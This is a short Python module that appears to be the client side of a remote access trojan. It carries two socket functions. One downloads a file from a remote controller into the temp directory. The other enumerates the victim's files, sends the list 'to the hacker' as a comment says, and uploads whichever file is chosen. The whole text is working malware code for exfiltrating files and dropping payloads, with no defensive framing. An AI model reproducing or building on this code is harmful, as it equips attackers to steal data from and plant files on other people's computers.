import glob
import json
import tempfile
import os


END_DELIMETER = "*END_OF_FILE*"


def download_files(my_socket):
    print("[+] Downloading files")
    tmp = tempfile.gettempdir()

    file_name = my_socket.receive_data()

    path_dir, actual_file_name = os.path.split(file_name)

    temp_path = os.path.join(tmp, actual_file_name)
    my_socket.receive_file(temp_path)


def upload_files(my_socket):
    print("[+] Uploading files")
    print("[+] Sending file")
    # first find the list of files to be uploaded
    files = glob.glob("*")
    dict = {}
    for index, file in enumerate(files):
        dict[index] = file
    dict_bytes = json.dumps(dict)

    # send list of files to the hacker for him to select files
    bytes_with_delimeter = dict_bytes + END_DELIMETER
    my_socket.socket.send(bytes_with_delimeter.encode())

    # receive the file name to download
    file2download = my_socket.receive_data()
    my_socket.send_file(file2download)